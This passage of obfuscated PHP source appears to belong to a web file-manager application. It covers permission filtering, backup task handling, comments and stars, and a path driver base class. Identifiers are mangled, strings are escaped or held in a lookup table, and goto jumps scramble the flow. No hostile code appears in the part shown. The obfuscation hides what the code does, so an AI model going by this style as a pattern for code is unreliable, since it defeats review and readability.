$this->filterAuth($Æ‰¸æ[$¼ïÙŠí€[490]]); return parent::update($¾Œ¨Ğôä, $Æ‰¸æ); } public function remove($üˆ¼¯â«) { $Äíø¿°õ = parent::listData($üˆ¼¯â«); if (!$Äíø¿°õ || $Äíø¿°õ[$_SERVER[ÅÄÇĞô][192]]) { return !1; } return parent::remove($üˆ¼¯â«); } public function add($ÈŒ³‡ÆÓ = array()) { $ùèÍÃ‘ =& $_SERVER[ÅÄÇĞô]; if ($this->findByName($ÈŒ³‡ÆÓ[$ùèÍÃ‘[32]])) { return !1; } $æÛ£³ñº = array($ùèÍÃ‘[32] => $ùèÍÃ‘[12], $ùèÍÃ‘[490] => 1, $ùèÍÃ‘[2021] => $ùèÍÃ‘[2008], $ùèÍÃ‘[2020] => 1, $ùèÍÃ‘[192] => 0, $ùèÍÃ‘[2022] => 0); $ÈŒ³‡ÆÓ = array_merge($æÛ£³ñº, $ÈŒ³‡ÆÓ); $ÈŒ³‡ÆÓ[$ùèÍÃ‘[2022]] = $this->getSort(); $this->filterAuth($ÈŒ³‡ÆÓ[$ùèÍÃ‘[490]]); return parent::insert($ÈŒ³‡ÆÓ); } private function getSort() { $Âùü–† =& $_SERVER[ÅÄÇĞô]; $ì¢¸êØ¿ = parent::listData(); $‘âúíÀ› = array_to_keyvalue($ì¢¸êØ¿, $Âùü–†[12], $Âùü–†[2022]); return empty($‘âúíÀ›) ? 0 : max($‘âúíÀ›) + 1; } private function filterAuth(&$”÷øƒÇÎ) { if (!$”÷øƒÇÎ) { return; } $Íöï»ƒĞ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ÀÎÅßŒ = array(); foreach ($Íöï»ƒĞ as $âı¨Ê˜®) { if ($”÷øƒÇÎ & $âı¨Ê˜®) { $ÀÎÅßŒ[] = $âı¨Ê˜®; } } if (in_array(self::AUTH_ROOT, $ÀÎÅßŒ)) { $”÷øƒÇÎ = array_sum($Íöï»ƒĞ); return; } $±™à±ã“ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ÀÎÅßŒ as $âı¨Ê˜®) { if (isset($±™à±ã“[$âı¨Ê˜®])) { $ÀÎÅßŒ = array_merge($ÀÎÅßŒ, $±™à±ã“[$âı¨Ê˜®]); } } $ÀÎÅßŒ[] = self::AUTH_SHOW; $”÷øƒÇÎ = array_sum(array_unique($ÀÎÅßŒ)); } public function sort($©ÄÌÉ‹”, $­øŒú³°) { return parent::update($©ÄÌÉ‹”, $­øŒú³°); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\x6d\x2e\142\x61\143\x6b\x75\160\114\x69\163\x74"; public $field = array("\x69\x6f", "\156\141\x6d\145", "\163\x74\141\164\165\163", "\x63\x6f\156\x74\x65\156\x74", "\155\x61\156\165\141\x6c", "\x72\145\x73\x75\154\164", "\x74\151\155\145\x46\x72\157\155", "\x74\x69\155\x65\x54\x6f"); public function config() { $ˆ˜¤ıòÂ =& $_SERVER[ÅÄÇĞô]; Action($ˆ˜¤ıòÂ[2023])->taskInit(); $©„ÅÜÏ™ = Model($ˆ˜¤ıòÂ[865])->get($ˆ˜¤ıòÂ[872]); $©„ÅÜÏ™ = json_decode($©„ÅÜÏ™, !0); $©„ÅÜÏ™ = is_array($©„ÅÜÏ™) ? $©„ÅÜÏ™ : array(); $this->parseContent($©„ÅÜÏ™); unset($©„ÅÜÏ™[$ˆ˜¤ıòÂ[1766]]); Model($ˆ˜¤ıòÂ[1765])->cacheClear(); $§«‡¹ = $ˆ˜¤ıòÂ[2024]; $üÁÙÈš = Model($ˆ˜¤ıòÂ[2025])->findByKey($ˆ˜¤ıòÂ[1784], $§«‡¹); if (!$üÁÙÈš) { $üÁÙÈš = array(); } if (isset($üÁÙÈš[$ˆ˜¤ıòÂ[207]])) { $üÁÙÈš[$ˆ˜¤ıòÂ[207]] = json_decode($üÁÙÈš[$ˆ˜¤ıòÂ[207]], !0); } if (isset($©„ÅÜÏ™[$ˆ˜¤ıòÂ[207]])) { $üÁÙÈš[$ˆ˜¤ıòÂ[207]][$ˆ˜¤ıòÂ[1769]] = $©„ÅÜÏ™[$ˆ˜¤ıòÂ[207]]; unset($©„ÅÜÏ™[$ˆ˜¤ıòÂ[207]]); } return array_merge($üÁÙÈš, $©„ÅÜÏ™); } public function listData($•Œ¤Ûı± = false, $óõŸà¼Œ = "\x6d\x6f\144\151\146\171\x54\x69\155\145", $Ééˆ·øª = false) { $ªò“”‰ = parent::listData($•Œ¤Ûı±, $óõŸà¼Œ, !0); if (!$ªò“”‰) { return $ªò“”‰; } if ($•Œ¤Ûı±) { $ªò“”‰ = array($ªò“”‰); } foreach ($ªò“”‰ as &$¥Ş£ ¦´) { $this->parseContent($¥Ş£ ¦´); } return $•Œ¤Ûı± ? $ªò“”‰[0] : $ªò“”‰; } public function parseContent(&$ÖÃêˆıó) { $ü¦¡Õ› =& $_SERVER[ÅÄÇĞô]; $ûªäªî½ = _get($ÖÃêˆıó, $ü¦¡Õ›[171], $ü¦¡Õ›[91]); if (!in_array($ûªäªî½, array($ü¦¡Õ›[871], $ü¦¡Õ›[1232]))) { $ÖÃêˆıó[$ü¦¡Õ›[171]] = $ûªäªî½ == $ü¦¡Õ›[91] ? $ü¦¡Õ›[1232] : $ü¦¡Õ›[871]; } } public function lastItem() { $öôß™ı« = $this->listData(); return !empty($öôß™ı«[0]) ? $öôß™ı«[0] : null; } public function kill($Ğ†ÓèÛ) { $¹›Ô«ƒ =& $_SERVER[ÅÄÇĞô]; $é€ÉÁÀ = $this->listData($Ğ†ÓèÛ); if (!$é€ÉÁÀ || empty($é€ÉÁÀ[$¹›Ô«ƒ[32]])) { return !0; } Task::kill($¹›Ô«ƒ[880]); Task::kill($¹›Ô«ƒ[899]); Task::kill($¹›Ô«ƒ[909]); $÷İóä¿õ = $é€ÉÁÀ[$¹›Ô«ƒ[32]]; $³âØß± = TEMP_FILES . $¹›Ô«ƒ[875] . $÷İóä¿õ . $¹›Ô«ƒ[8]; IO::remove($³âØß±, !1); return $this->remove($Ğ†ÓèÛ); } public function remove($í€ÛŞÏâ) { $¦‘Åü¼‹ = $this->listData($í€ÛŞÏâ); if (!$¦‘Åü¼‹) { return !0; } return $this->backupRemove($¦‘Åü¼‹); } private function backupRemove($µó¬¢Ø¬) { parent::remove($µó¬¢Ø¬[$_SERVER[ÅÄÇĞô][478]]); $ëéõëçˆ = $this->backupPath($µó¬¢Ø¬); IO::remove($ëéõëçˆ, !1); return !0; } private function backupPath($íç­¸­±) { $¼ áĞ™î =& $_SERVER[ÅÄÇĞô]; $ôÑ™—ŠÙ = $íç­¸­±[$¼ áĞ™î[32]]; $ô‘®é÷³ = Model($¼ áĞ™î[865])->get($¼ áĞ™î[866]); $¯Ì¥´Ú· = substr(md5($¼ áĞ™î[867] . $ô‘®é÷³ . $ôÑ™—ŠÙ), 0, 8); return "\x7b\151\x6f\x3a{$íç­¸­±[$¼ áĞ™î[847]]}\x7d\57\x64\x61\164\141\x62\x61\163\x65\x2f\142\141\x63\153\165\160\x2f" . $ôÑ™—ŠÙ . $¼ áĞ™î[11] . $¯Ì¥´Ú·; } public function start() { $‡‘ÔÓé¿ =& $_SERVER[ÅÄÇĞô]; if ($GLOBALS[$‡‘ÔÓé¿[6]][$‡‘ÔÓé¿[92]][$‡‘ÔÓé¿[2026]] != $‡‘ÔÓé¿[91]) { return !0; } $Éƒ¶ãıÎ = $this->config(); if (!$Éƒ¶ãıÎ || $Éƒ¶ãıÎ[$‡‘ÔÓé¿[1766]] != $‡‘ÔÓé¿[91]) { return !1; } if ($Éƒ¶ãıÎ[$‡‘ÔÓé¿[171]] == $‡‘ÔÓé¿[871]) { $ƒó¦Ä• = Model($‡‘ÔÓé¿[865])->get($‡‘ÔÓé¿[1347]); if ($ƒó¦Ä• == $‡‘ÔÓé¿[1348]) { $Éƒ¶ãıÎ[$‡‘ÔÓé¿[171]] = $‡‘ÔÓé¿[1232]; } } $§¬©‹»Š = $this->process(); foreach ($§¬©‹»Š as $½“³ÏÃğ) { if ($½“³ÏÃğ) { return Task::restart($½“³ÏÃğ[$‡‘ÔÓé¿[478]]); } } $‹ÍÅœ± = new Backup(); $úºë¶ã = $‹ÍÅœ±->db(); if ($úºë¶ã) { $úºë¶ã = $‹ÍÅœ±->dbFile(); if ($úºë¶ã && $Éƒ¶ãıÎ[$‡‘ÔÓé¿[171]] == $‡‘ÔÓé¿[871]) { $úºë¶ã = $‹ÍÅœ±->file(); } } Backup::set(array($‡‘ÔÓé¿[845] => 1, $‡‘ÔÓé¿[856] => time())); return !0; } public function process() { $¶—ü¢–¾ =& $_SERVER[ÅÄÇĞô]; $„—œô†™ = array($¶—ü¢–¾[852] => Task::get($¶—ü¢–¾[880]), $¶—ü¢–¾[857] => Task::get($¶—ü¢–¾[899]), $¶—ü¢–¾[233] => Task::get($¶—ü¢–¾[909])); $ş‡ë“·  = !1; foreach ($„—œô†™ as &$­®èá»¬) { if ($ş‡ë“· ) { $­®èá»¬ = !1; continue; } if ($­®èá»¬) { $­˜¸©ú‡ = intval(_get($­®èá»¬, $¶—ü¢–¾[1802], 0)); if (time() - $­˜¸©ú‡ > 7200) { Task::kill($­®èá»¬[$¶—ü¢–¾[478]]); $ş‡ë“·  = !0; $­®èá»¬ = !1; } } } return $„—œô†™; } public function restore() { $™¸ éõ’ =& $_SERVER[ÅÄÇĞô]; ActionCall($™¸ éõ’[1160], !0, 1); ActionCall($™¸ éõ’[1160], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\x6d\155\145\x6e\x74"; protected $tableMeta = array("\164\141\x62\154\x65\x4e\141\155\145" => "\143\x6f\x6d\x6d\x65\x6e\164\x5f\x6d\145\x74\141", "\155\x65\x74\141\x46\x69\145\154\x64" => "\143\x6f\x6d\x6d\x65\156\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ÇàáôÙÌ) { $ëµğæµ£ =& $_SERVER[ÅÄÇĞô]; if ($ÇàáôÙÌ[$ëµğæµ£[2027]]) { $ç¬àÔ¤ = $this->where(array($ëµğæµ£[2028] => $ÇàáôÙÌ[$ëµğæµ£[2027]]))->find(); if (!$ç¬àÔ¤ || $ç¬àÔ¤[$ëµğæµ£[191]] != $ÇàáôÙÌ[$ëµğæµ£[191]] || $ç¬àÔ¤[$ëµğæµ£[574]] != $ÇàáôÙÌ[$ëµğæµ£[574]]) { return !1; } $this->where(array($ëµğæµ£[2028] => $ÇàáôÙÌ[$ëµğæµ£[2027]]))->setAdd($ëµğæµ£[2029], 1); } $ÇàáôÙÌ[$ëµğæµ£[2030]] = 0; $ÇàáôÙÌ[$ëµğæµ£[2029]] = 0; $ÇàáôÙÌ[$ëµğæµ£[845]] = 1; return $this->add($ÇàáôÙÌ); } public function commentCount($™‚Æ’À, $¡Ì“¦ŒÌ, $ÓÛæ = false) { $ıÅ‰ãª =& $_SERVER[ÅÄÇĞô]; if (!$™‚Æ’À) { return array(); } if (is_string($™‚Æ’À) || is_int($™‚Æ’À)) { $™‚Æ’À = array($™‚Æ’À); } $ğ¾í˜Ø® = array($ıÅ‰ãª[574], $ıÅ‰ãª[2031] => $ıÅ‰ãª[570]); $ìùÌ’»˜ = array($ıÅ‰ãª[574] => array($ıÅ‰ãª[7], $™‚Æ’À), $ıÅ‰ãª[191] => $¡Ì“¦ŒÌ); if ($ÓÛæ) { $ìùÌ’»˜[$ıÅ‰ãª[1797]] = $ÓÛæ; } $°ÏÁ…åÜ = $this->field($ğ¾í˜Ø®)->where($ìùÌ’»˜)->group($ıÅ‰ãª[574])->select(); return array_to_keyvalue($°ÏÁ…åÜ, $ıÅ‰ãª[574], $ıÅ‰ãª[570]); } public function starTarget($Š×‹“Ïñ, $òğ®©û) { $ÍÊ•ó®ó =& $_SERVER[ÅÄÇĞô]; $å¦½•£ = $Š×‹“Ïñ + self::TYPE_STAR_OFFSET; $ãÙ½ùÄ = array($ÍÊ•ó®ó[1797] => USER_ID, $ÍÊ•ó®ó[191] => $å¦½•£, $ÍÊ•ó®ó[574] => $òğ®©û); $İà³ıÊ› = $this->where($ãÙ½ùÄ)->find(); if ($İà³ıÊ›) { return $this->where(array($ÍÊ•ó®ó[478] => $İà³ıÊ›[$ÍÊ•ó®ó[478]]))->delete(); } $á÷ÃÆ© = array($ÍÊ•ó®ó[2027] => 0, $ÍÊ•ó®ó[1797] => USER_ID, $ÍÊ•ó®ó[845] => 1, $ÍÊ•ó®ó[171] => $ÍÊ•ó®ó[12], $ÍÊ•ó®ó[191] => $å¦½•£, $ÍÊ•ó®ó[574] => $òğ®©û, $ÍÊ•ó®ó[2030] => 0, $ÍÊ•ó®ó[2029] => 0); return $this->add($á÷ÃÆ©); } public function starTargetCount($‡î¼¦¬, $ŞŒç¸¡) { $Ÿ ØœºÎ =& $_SERVER[ÅÄÇĞô]; $ ºÂ´®ı = $ŞŒç¸¡ + self::TYPE_STAR_OFFSET; $½Ôì°Âœ = $this->commentCount($‡î¼¦¬, $ ºÂ´®ı); $ış›ıù = $this->commentCount($‡î¼¦¬, $ ºÂ´®ı, USER_ID); return array($Ÿ ØœºÎ[2032] => $½Ôì°Âœ, $Ÿ ØœºÎ[2033] => $ış›ıù); } public function starTargetUserList($š€ë±â, $Øˆ¶ƒÁ) { $Ëó¨¨í¸ =& $_SERVER[ÅÄÇĞô]; $ò£‘Ö = $š€ë±â + self::TYPE_STAR_OFFSET; $“Ó÷§³ë = array($Ëó¨¨í¸[574] => $Øˆ¶ƒÁ, $Ëó¨¨í¸[191] => $ò£‘Ö); $åïŸÛ§œ = $this->where($“Ó÷§³ë)->count(); $Ûæ›®‡ = array($Ëó¨¨í¸[335] => $åïŸÛ§œ, $Ëó¨¨í¸[2034] => array()); if (!$åïŸÛ§œ) { return $Ûæ›®‡; } $í×ôœÈŠ = $this->field($Ëó¨¨í¸[1797])->where($“Ó÷§³ë)->limit(500)->select(); $í×ôœÈŠ = array_to_keyvalue($í×ôœÈŠ, $Ëó¨¨í¸[12], $Ëó¨¨í¸[1797]); $Ûæ›®‡[$Ëó¨¨í¸[2034]] = Model($Ëó¨¨í¸[582])->userListInfo($í×ôœÈŠ); return $Ûæ›®‡; } public function prasiseUserList($Ô¥ÓÔÛâ) { $ñßşìö¨ =& $_SERVER[ÅÄÇĞô]; $€®¹¼Û = array($ñßşìö¨[2035] => $Ô¥ÓÔÛâ); $íÊ³Î¸¦ = $this->where($€®¹¼Û)->find(); $ÀüÎ³€ë = _get($íÊ³Î¸¦, $ñßşìö¨[2030], 0); $ŸòŠ§¸± = array($ñßşìö¨[335] => $ÀüÎ³€ë, $ñßşìö¨[2034] => array()); if (!$ÀüÎ³€ë) { return $ŸòŠ§¸±; } $¡”úò¹š = Model($ñßşìö¨[2036])->field($ñßşìö¨[1797])->where($€®¹¼Û)->limit(500)->select(); $¡”úò¹š = array_to_keyvalue($¡”úò¹š, $ñßşìö¨[12], $ñßşìö¨[1797]); $ŸòŠ§¸±[$ñßşìö¨[2034]] = Model($ñßşìö¨[582])->userListInfo($¡”úò¹š); return $ŸòŠ§¸±; } public function remove($ÄŠ°Üû) { $ê½Ëº =& $_SERVER[ÅÄÇĞô]; $¶€½È³ = array($ê½Ëº[2028] => $ÄŠ°Üû); $Ù×´ = $this->where($¶€½È³)->find(); if ($Ù×´[$ê½Ëº[2027]]) { $this->where(array($ê½Ëº[2028] => $Ù×´[$ê½Ëº[2027]]))->setAdd($ê½Ëº[2029], -1); } return $this->where($¶€½È³)->delete(); } public function edit($À‡Œç, $²êá‰¢) { $»ô»¢åÌ =& $_SERVER[ÅÄÇĞô]; $ìûä¡×ö = array($»ô»¢åÌ[2028] => $À‡Œç); return $this->where($ìûä¡×ö)->save(array($»ô»¢åÌ[2037] => $²êá‰¢)); } public function prasise($¾Ê¢‡®®) { $ï Èí½¼ =& $_SERVER[ÅÄÇĞô]; $›È–œ”Ë = Model($ï Èí½¼[2038]); $»İ«ÇÈ = array($ï Èí½¼[2028] => $¾Ê¢‡®®, $ï Èí½¼[1788] => USER_ID); $—µÈÉË„ = $›È–œ”Ë->where($»İ«ÇÈ)->find(); if (!$—µÈÉË„) { $›È–œ”Ë->add($»İ«ÇÈ); $ÏÒ»éë = $this->where(array($ï Èí½¼[2028] => $¾Ê¢‡®®))->setAdd($ï Èí½¼[2030], 1); } else { $›È–œ”Ë->where($»İ«ÇÈ)->delete(); $ÏÒ»éë = $this->where(array($ï Èí½¼[2028] => $¾Ê¢‡®®))->setAdd($ï Èí½¼[2030], -1); } return $ÏÒ»éë; } public function targetInfo($ÔÕ®ÉÌ®, $ôÂÊîíÃ) { $¢ ª»Ö” =& $_SERVER[ÅÄÇĞô]; $ÜÓÅ”ùô = array($¢ ª»Ö”[656] => $ÔÕ®ÉÌ®, $¢ ª»Ö”[657] => $ôÂÊîíÃ); $©³½¢²˜ = $this->where($ÜÓÅ”ùô)->count(); $›½­¡Ï× = "\122\111\107\110\x54\40\x4a\x4f\111\x4e\40{$this->tablePrefix}\x63\157\155\x6d\145\156\164\x5f\x70\x72\x61\x69\x73\x65\40\x73\164\x61\162\x20\x6f\156\40\143\157\x6d\155\x65\156\164\x2e\x63\x6f\155\155\x65\156\164\111\x44\x20\x3d\40\163\x74\141\162\56\x63\157\155\155\x65\x6e\164\x49\x44"; $ô·‘Öò = $this->alias($¢ ª»Ö”[432])->where($ÜÓÅ”ùô)->join($›½­¡Ï×, $¢ ª»Ö”[2039])->count(); $…²¦Ø¾Õ = array($¢ ª»Ö”[2040] => $©³½¢²˜, $¢ ª»Ö”[2041] => $ô·‘Öò); return $…²¦Ø¾Õ; } public function listData($ÏÎ¯Ñâœ) { $ÛæÁÑ–¯ =& $_SERVER[ÅÄÇĞô]; if (isset($ÏÎ¯Ñâœ[$ÛæÁÑ–¯[2042]])) { if ($ÏÎ¯Ñâœ[$ÛæÁÑ–¯[2042]]) { $ÏÎ¯Ñâœ[$ÛæÁÑ–¯[2035]] = array($ÛæÁÑ–¯[1114], intval($ÏÎ¯Ñâœ[$ÛæÁÑ–¯[2042]])); } unset($ÏÎ¯Ñâœ[$ÛæÁÑ–¯[2042]]); } if (isset($ÏÎ¯Ñâœ[$ÛæÁÑ–¯[2043]])) { if ($ÏÎ¯Ñâœ[$ÛæÁÑ–¯[2043]]) { $ÏÎ¯Ñâœ[$ÛæÁÑ–¯[2035]] = array($ÛæÁÑ–¯[1111], intval($ÏÎ¯Ñâœ[$ÛæÁÑ–¯[2043]])); } unset($ÏÎ¯Ñâœ[$ÛæÁÑ–¯[2043]]); } return $this->_listData($ÏÎ¯Ñâœ); } private function _listData($¶¡ÌÌø«) { $™Ï³ıÑê =& $_SERVER[ÅÄÇĞô]; $ÄğÙ «¶ = $this->where($¶¡ÌÌø«)->_makeOrder()->selectPage(100); $this->_listAppendParent($ÄğÙ «¶[$™Ï³ıÑê[448]]); $this->_listAppendUser($ÄğÙ «¶[$™Ï³ıÑê[448]]); $this->_listAppendMeta($ÄğÙ «¶[$™Ï³ıÑê[448]]); return $ÄğÙ «¶; } private function _makeOrder() { $ˆ’§£† =& $_SERVER[ÅÄÇĞô]; $àğÛ¹Ôç = array($ˆ’§£†[2030], $ˆ’§£†[2029], $ˆ’§£†[234]); $İÎµîÛ¼ = Input::get($ˆ’§£†[533], $ˆ’§£†[7], $ˆ’§£†[500], $àğÛ¹Ôç); $ĞÁÍöàÆ = Input::get($ˆ’§£†[534], $ˆ’§£†[7], $ˆ’§£†[1790], array($ˆ’§£†[2044], $ˆ’§£†[529])); $Û¤›ƒ Í = $İÎµîÛ¼ . $ˆ’§£†[53] . $ĞÁÍöàÆ; return $this->order($Û¤›ƒ Í); } private function _listAppendParent(&$÷¡—„¯„) { $§Äƒñí =& $_SERVER[ÅÄÇĞô]; $ßê™Úœµ = array_unique(array_to_keyvalue($÷¡—„¯„, $§Äƒñí[12], $§Äƒñí[2027])); $ßê™Úœµ = array_remove_value($ßê™Úœµ, $§Äƒñí[231]); if (!$ßê™Úœµ) { return; } $ìşğˆ°Ø = $this->where(array($§Äƒñí[2028] => array($§Äƒñí[7], $ßê™Úœµ)))->select(); $ìşğˆ°Ø = array_to_keyvalue($ìşğˆ°Ø, $§Äƒñí[2035]); foreach ($÷¡—„¯„ as &$š×®ïÅü) { if (isset($ìşğˆ°Ø[$š×®ïÅü[$§Äƒñí[2027]]])) { $š×®ïÅü[$§Äƒñí[2045]] = $ìşğˆ°Ø[$š×®ïÅü[$§Äƒñí[2027]]]; } } unset($š×®ïÅü); } private function _listAppendUser(&$ö·ò—çÙ) { $µ¬¸Á›ğ =& $_SERVER[ÅÄÇĞô]; $´èÄ´ÇŠ = array_unique(array_to_keyvalue($ö·ò—çÙ, $µ¬¸Á›ğ[12], $µ¬¸Á›ğ[1797])); $´èÄ´ÇŠ = array_remove_value($´èÄ´ÇŠ, $µ¬¸Á›ğ[231]); if (count($´èÄ´ÇŠ) == 0) { return; } foreach ($ö·ò—çÙ as $çƒİ²÷) { if (isset($çƒİ²÷[$µ¬¸Á›ğ[2045]])) { $´èÄ´ÇŠ[] = $çƒİ²÷[$µ¬¸Á›ğ[2045]][$µ¬¸Á›ğ[1797]]; } } $ñ¦à©Øï = Model($µ¬¸Á›ğ[602])->userListInfo($´èÄ´ÇŠ); foreach ($ö·ò—çÙ as &$çƒİ²÷) { $çƒİ²÷[$µ¬¸Á›ğ[670]] = $ñ¦à©Øï[$çƒİ²÷[$µ¬¸Á›ğ[1797]]]; if (isset($çƒİ²÷[$µ¬¸Á›ğ[2045]])) { $çƒİ²÷[$µ¬¸Á›ğ[2045]][$µ¬¸Á›ğ[670]] = $ñ¦à©Øï[$çƒİ²÷[$µ¬¸Á›ğ[2045]][$µ¬¸Á›ğ[1797]]]; } } unset($çƒİ²÷); } private function _listAppendMeta(&$±‘ç–İ£) { $™şÂë¨ =& $_SERVER[ÅÄÇĞô]; $¾ºªÖğ¦ = array_unique(array_to_keyvalue($±‘ç–İ£, $™şÂë¨[12], $™şÂë¨[2035])); $¾ºªÖğ¦ = array_remove_value($¾ºªÖğ¦, $™şÂë¨[231]); if (!$¾ºªÖğ¦) { return; } foreach ($±‘ç–İ£ as $·˜ÀéãŸ) { if (isset($·˜ÀéãŸ[$™şÂë¨[2045]])) { $¾ºªÖğ¦[] = $·˜ÀéãŸ[$™şÂë¨[2045]][$™şÂë¨[2035]]; } } $¥ÉãÖ = $this->metaList($¾ºªÖğ¦); if (!$¥ÉãÖ) { return !1; } foreach ($±‘ç–İ£ as &$·˜ÀéãŸ) { $·˜ÀéãŸ[$™şÂë¨[544]] = $¥ÉãÖ[$·˜ÀéãŸ[$™şÂë¨[2035]]]; if (isset($·˜ÀéãŸ[$™şÂë¨[2045]])) { $·˜ÀéãŸ[$™şÂë¨[2045]][$™şÂë¨[544]] = $¥ÉãÖ[$·˜ÀéãŸ[$™şÂë¨[2045]][$™şÂë¨[2035]]]; } } unset($·˜ÀéãŸ); } private function metaList($™ûŞÄöâ) { $Ñ…Ë¿Çº =& $_SERVER[ÅÄÇĞô]; if (!$™ûŞÄöâ) { return array(); } $ìÚç = array($Ñ…Ë¿Çº[2035] => array($Ñ…Ë¿Çº[7], $™ûŞÄöâ)); $£îÎğº = Model($Ñ…Ë¿Çº[2046])->where($ìÚç)->select(); $£îÎğº = array_to_keyvalue_group($£îÎğº, $Ñ…Ë¿Çº[2035]); foreach ($£îÎğº as $Ûîä³ÃÓ => $ëÉ‚±å—) { $‘ê¼ØÈ´ = array(); foreach ($ëÉ‚±å— as $™¸ôÚ„¸) { $‘ê¼ØÈ´[$™¸ôÚ„¸[$Ñ…Ë¿Çº[97]]] = $™¸ôÚ„¸[$Ñ…Ë¿Çº[453]]; } $£îÎğº[$Ûîä³ÃÓ] = $‘ê¼ØÈ´; } return $£îÎğº ? $£îÎğº : array(); } public function removeTarget($¥ÙºëÖ‰, $Æú»Ö™¢) { $à¨üÀç =& $_SERVER[ÅÄÇĞô]; if (!$Æú»Ö™¢) { return !0; } $Æú»Ö™¢ = is_array($Æú»Ö™¢) ? $Æú»Ö™¢ : array($Æú»Ö™¢); $‹ÃõæóÊ = array($à¨üÀç[191] => $¥ÙºëÖ‰, $à¨üÀç[574] => array($à¨üÀç[7], $Æú»Ö™¢)); $ê·‡¥Œ‰ = $this->field($à¨üÀç[2035])->where($‹ÃõæóÊ)->select(); $Š¤ÂÅ®ù = array_to_keyvalue($ê·‡¥Œ‰, $à¨üÀç[12], $à¨üÀç[2035]); if (!$Š¤ÂÅ®ù) { return !0; } $‹ÃõæóÊ = array($à¨üÀç[2035] => array($à¨üÀç[7], $Š¤ÂÅ®ù)); $this->where($‹ÃõæóÊ)->delete(); Model($à¨üÀç[2038])->where($‹ÃõæóÊ)->delete(); Model($à¨üÀç[2047])->where($‹ÃõæóÊ)->delete(); } } goto d¿„Êßì‘; b”Ø‹›¬ŒÏ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $úĞÎÅ•ï =& $_SERVER[ÅÄÇĞô]; $this->objectDriver = array($úĞÎÅ•ï[60], $úĞÎÅ•ï[61], $úĞÎÅ•ï[62], $úĞÎÅ•ï[63], $úĞÎÅ•ï[64], $úĞÎÅ•ï[65], $úĞÎÅ•ï[66], $úĞÎÅ•ï[67], $úĞÎÅ•ï[68], $úĞÎÅ•ï[69], $úĞÎÅ•ï[70], $úĞÎÅ•ï[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($ô³­…šÙ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($ô³­…šÙ, $_SERVER[ÅÄÇĞô][8]); } return $ô³­…šÙ; } public function iconvApp($ÌïÏƒ–Ë) { return $ÌïÏƒ–Ë; } public function iconvSystem($‰ŞÜÊš¨) { return $‰ŞÜÊš¨; } public function iconvTo($šÚ‹•‚¨, $Õù…‰ã, $èğ›æØ£) { $©ëÎè‚§ =& $_SERVER[ÅÄÇĞô]; if (!$šÚ‹•‚¨ || !function_exists($©ëÎè‚§[72])) { return $šÚ‹•‚¨; } static $ı¬ü¯” = array(); $’óèÌ = $Õù…‰ã . $©ëÎè‚§[73] . $èğ›æØ£ . $©ëÎè‚§[74] . $šÚ‹•‚¨; if (isset($ı¬ü¯”[$’óèÌ])) { return $ı¬ü¯”[$’óèÌ]; } if (function_exists($©ëÎè‚§[75])) { $’Û€ ¾Š = @mb_convert_encoding($šÚ‹•‚¨, $èğ›æØ£, $Õù…‰ã); } else { $’Û€ ¾Š = @iconv($Õù…‰ã, $èğ›æØ£, $šÚ‹•‚¨); } $’Û€ ¾Š = $’Û€ ¾Š ? $’Û€ ¾Š : $šÚ‹•‚¨; if (strstr($’Û€ ¾Š, $©ëÎè‚§[76])) { $’Û€ ¾Š = str_replace($©ëÎè‚§[76], $©ëÎè‚§[11], $’Û€ ¾Š); } $ı¬ü¯”[$Õù…‰ã . $©ëÎè‚§[73] . $èğ›æØ£ . $©ëÎè‚§[74] . $šÚ‹•‚¨] = $’Û€ ¾Š; $ı¬ü¯”[$èğ›æØ£ . $©ëÎè‚§[73] . $Õù…‰ã . $©ëÎè‚§[74] . $šÚ‹•‚¨] = $šÚ‹•‚¨; $ı¬ü¯”[$èğ›æØ£ . $©ëÎè‚§[73] . $Õù…‰ã . $©ëÎè‚§[74] . $’Û€ ¾Š] = $šÚ‹•‚¨; $ı¬ü¯”[$Õù…‰ã . $©ëÎè‚§[73] . $èğ›æØ£ . $©ëÎè‚§[74] . $’Û€ ¾Š] = $’Û€ ¾Š; return $’Û€ ¾Š; } public function getPathInner($ñ¼ô¹ô­) { $‰Á¬à¥ = IO::init($ñ¼ô¹ô­); return $‰Á¬à¥->path; } public function getPathOuter($ÙúÆµŠº) { $ò‘çšÌØ =& $_SERVER[ÅÄÇĞô]; $ÃšñŒ¥È = strlen(trim($this->pathBase, $ò‘çšÌØ[8])); $ÙúÆµŠº = substr(trim($ÙúÆµŠº, $ò‘çšÌØ[8]), $ÃšñŒ¥È); return $this->pathDriver . $ò‘çšÌØ[8] . ltrim($ÙúÆµŠº, $ò‘çšÌØ[8]); } public function isParentOf($ÉÉÊ›¹…, $ı±Â–üë) { $ê„ÓØÒÆ =& $_SERVER[ÅÄÇĞô]; $ÉÉÊ›¹… = rtrim(strtolower($ÉÉÊ›¹…), $ê„ÓØÒÆ[8]) . $ê„ÓØÒÆ[8]; $ı±Â–üë = rtrim(strtolower($ı±Â–üë), $ê„ÓØÒÆ[8]) . $ê„ÓØÒÆ[8]; $â©ø±’ß = strpos($ı±Â–üë, $ÉÉÊ›¹…) === 0; return $â©ø±’ß; } public function getType() { $â½”Îø =& $_SERVER[ÅÄÇĞô]; $¯£àÆÂ = str_replace($â½”Îø[77], $â½”Îø[12], get_class($this)); return strtolower($¯£àÆÂ); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($èÆãš½, $…íœÛ¥ò) { 